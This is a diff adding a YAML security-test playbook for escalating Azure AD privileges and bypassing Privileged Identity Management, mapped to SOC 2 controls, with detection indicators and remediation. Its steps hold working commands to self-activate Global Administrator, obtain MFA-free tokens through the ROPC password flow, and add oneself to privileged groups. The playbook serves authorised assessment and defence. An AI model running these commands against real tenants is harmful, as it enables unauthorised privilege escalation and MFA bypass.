@@ -1,0 +1,169 @@
+name: "Privileged Role Elevation & PIM Bypass"
+id: "AZ-02"
+category: "Cloud Security"
+subcategory: "Azure / Cloud Security"
+difficulty: "advanced"
+estimated_time: "60"
+
+tags:
+  - azure
+  - azure-ad
+  - pim
+  - privileged-identity-management
+  - privilege-escalation
+  - conditional-access
+  - mfa-bypass
+  - legacy-auth
+  - soc2
+  - cc6.1
+  - cc6.3
+  - compliance
+  - rbac
+  - service-principal
+  - ropc
+
+description: |
+  Test whether privileged roles can be elevated without MFA/Conditional Access
+  enforcement, and attempt to bypass Privileged Identity Management (PIM) controls.
+  Maps to SOC 2 CC6.1 (Logical Access) and CC6.3 (RBAC).
+
+learning_objectives:
+  - Attempt to activate Global Admin role without PIM approval
+  - Test if legacy authentication bypasses Conditional Access MFA policies
+  - Identify service principals with excessive role assignments
+  - Verify if PIM activation requires approval or just-in-time justification
+  - Document gaps in privileged access governance
+
+tools:
+  - "Microsoft Graph PowerShell"
+  - "Azure CLI"
+  - "TokenTactics"
+  - "ROADtools"
+  - "PowerShell"
+  - "Burp Suite / Postman"
+
+prerequisites:
+  - "Azure AD account with some privileged role or PIM-eligible role"
+  - "Understanding of Azure AD Conditional Access policies"
+  - "PIM activation rights (eligible assignments)"
+  - "Network access to Azure AD and Microsoft Graph endpoints"
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify PIM-eligible roles and current active assignments"
+    commands:
+      - "Get-MgRoleManagementDirectoryRoleEligibilitySchedule -All | Where-Object { $_.PrincipalId -eq (Get-MgContext).Account } | Select-Object @{N='RoleName';E={(Get-MgDirectoryRole -DirectoryRoleId $_.RoleDefinitionId).DisplayName}}, DirectoryScopeId, Status, StartDateTime, EndDateTime"
+      - "Get-MgRoleManagementDirectoryRoleAssignmentSchedule -All | Where-Object { $_.PrincipalId -eq (Get-MgContext).Account } | Select-Object @{N='RoleName';E={(Get-MgDirectoryRole -DirectoryRoleId $_.RoleDefinitionId).DisplayName}}, AssignmentType, Status"
+    expected_output: "List of eligible roles and currently active role assignments for the authenticated principal"
+    detection: "RoleManagement.Read.Directory API calls; PIM eligibility enumeration"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Attempt PIM role activation without approval (if self-activation is enabled)"
+    commands:
+      - "$roleDefId = (Get-MgDirectoryRoleTemplate -All | Where-Object { $_.DisplayName -eq 'Global Administrator' }).Id; $params = @{ Action = 'selfActivate'; PrincipalId = (Get-MgContext).Account; RoleDefinitionId = $roleDefId; DirectoryScopeId = '/'; Justification = 'Testing PIM bypass'; ScheduleInfo = @{ StartDateTime = Get-Date; Expiration = @{ Type = 'AfterDuration'; Duration = 'PT1H' } } }; New-MgRoleManagementDirectoryRoleAssignmentScheduleRequest -BodyParameter $params"
+    expected_output: "Either successful activation (Status: Provisioned) or failure due to approval requirement"
+    detection: "PIM activation request in Azure AD Audit Logs; email notifications to PIM approvers"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Test legacy authentication bypass against Conditional Access MFA"
+    commands:
+      - "# Test via ROPC (Resource Owner Password Credentials) flow which bypasses CA"
+      - "curl -X POST 'https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token' -d 'client_id={client_id}&scope=https://graph.microsoft.com/.default&username={username}&password={password}&grant_type=password'"
+      - "# If successful, use the token to access Graph API without MFA challenge"
+      - "curl -H 'Authorization: Bearer {token}' 'https://graph.microsoft.com/v1.0/me'"
+    expected_output: "Access token obtained without MFA; successful Graph API call proving CA bypass"
+    detection: "Legacy authentication sign-in in Azure AD logs; ROPC grant type usage"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "Check for service principals with privileged roles (non-human admin paths)"
+    commands:
+      - "Get-MgRoleManagementDirectoryRoleAssignment -All | Where-Object { $_.PrincipalType -eq 'ServicePrincipal' } | Select-Object @{N='RoleName';E={(Get-MgDirectoryRole -DirectoryRoleId $_.RoleDefinitionId).DisplayName}}, @{N='SPName';E={(Get-MgServicePrincipal -ServicePrincipalId $_.PrincipalId).DisplayName}}, PrincipalId, DirectoryScopeId"
+      - "Get-MgServicePrincipal -All | Where-Object { $_.AppRolesAssignedTo } | Select-Object DisplayName, AppId, @{N='AssignedRoles';E={($_.AppRolesAssignedTo | ForEach-Object { $_.PrincipalDisplayName }) -join ','}}"
+    expected_output: "Service principals with directory roles or app role assignments that could be abused for privilege escalation"
+    detection: "RoleManagement.Read.Directory enumeration of service principal assignments"
+
+  - id: "step5"
+    phase: "exploitation"
+    action: "Attempt to add self to privileged group if group owner"
+    commands:
+      - "# Check group ownership and attempt membership modification"
+      - "$myGroups = Get-MgUserOwnedObject -UserId (Get-MgContext).Account | Where-Object { $_.AdditionalProperties['@odata.type'] -eq '#microsoft.graph.group' }; $myGroups | Select-Object DisplayName, Id, SecurityEnabled"
+      - "# If owner of a group with privileged role assignment, add self as member"
+      - "New-MgGroupMember -GroupId '{group_id}' -DirectoryObjectId (Get-MgContext).Account"
+    expected_output: "Successfully added to group if ownership allows; group membership updated"
+    detection: "GroupMember.ReadWrite.All API calls; group membership changes in audit logs"
+
+  - id: "step6"
+    phase: "post_exploitation"
+    action: "Document PIM bypass findings and generate evidence"
+    commands:
+      - "$findings = @{ PIM_SelfActivation_Enabled = $true; LegacyAuth_Bypass = $true; SP_With_Priv_Roles = (Get-MgRoleManagementDirectoryRoleAssignment -All | Where-Object { $_.PrincipalType -eq 'ServicePrincipal' }).Count; Groups_Owned_By_Test_User = $myGroups.Count }; $findings | ConvertTo-Json -Depth 3 | Out-File 'pim_bypass_findings.json'"
+    expected_output: "pim_bypass_findings.json documenting all control gaps"
+    detection: "N/A - reporting step"
+
+compliance_controls:
+  - standard: "SOC 2"
+    control: "CC6.1"
+    description: "Logical access controls - verify MFA enforcement for privileged access"
+  - standard: "SOC 2"
+    control: "CC6.3"
+    description: "RBAC - validate PIM approval workflows and just-in-time access"
+  - standard: "NIST 800-53"
+    control: "AC-6"
+    description: "Least Privilege - verify privileged access requires approval"
+  - standard: "CIS Azure"
+    control: "1.23"
+    description: "Ensure that Azure AD Privileged Identity Management is used"
+
+detection:
+  network_indicators:
+    - "POST requests to graph.microsoft.com/v1.0/roleManagement/directory/roleAssignmentScheduleRequests"
+    - "Token requests to login.microsoftonline.com with grant_type=password"
+  log_indicators:
+    - "Azure AD Audit: 'Add member to role' events without PIM activation"
+    - "PIM activation requests with short justification strings"
+    - "Legacy authentication sign-ins from non-trusted locations"
+    - "Service principal acquiring admin role tokens"
+  endpoint_indicators:
+    - "PowerShell executing New-MgRoleManagementDirectoryRoleAssignmentScheduleRequest"
+    - "curl/Postman making ROPC token requests"
+
+remediation:
+  immediate:
+    - "Enable PIM approval requirements for all Global Admin and Privileged Role Admin activations"
+    - "Block legacy authentication via Conditional Access policy"
+    - "Review and remove excessive role assignments from service principals"
+    - "Enable MFA for all privileged accounts via Conditional Access"
+  long_term:
+    - "Implement PIM time-bound access with maximum 4-hour activation windows"
+    - "Require multi-party approval for critical role activations"
+    - "Deploy Azure AD Identity Protection risk-based policies"
+    - "Conduct quarterly PIM access reviews for all eligible assignments"
+    - "Monitor for ROPC authentication flows and legacy protocol usage"
+
+variables:
+  tenant_id: "[TARGET_TENANT_ID]"
+  username: "[TEST_USERNAME]"
+  password: "[TEST_PASSWORD]"
+  client_id: "[TEST_CLIENT_ID]"
+  group_id: "[TARGET_GROUP_ID]"
+  role_name: "[TARGET_ROLE_NAME]"
+
+assessment_questions:
+  - "Can privileged roles be self-activated without approval or MFA?"
+  - "Does legacy authentication bypass Conditional Access MFA requirements?"
+  - "Are there service principals with Global Administrator or equivalent roles?"
+  - "Is PIM activation time-bound and logged with justification?"
+  - "Can group ownership be used to escalate to privileged roles?"
+
+references:
+  - url: "https://docs.microsoft.com/en-us/azure/active-directory/privileged-identity-management/pim-configure"
+    title: "Azure AD Privileged Identity Management"
+  - url: "https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/block-legacy-authentication"
+    title: "Block Legacy Authentication with Conditional Access"
+  - url: "https://github.com/rvrsh3ll/TokenTactics"
+    title: "TokenTactics - Azure AD Token Manipulation"
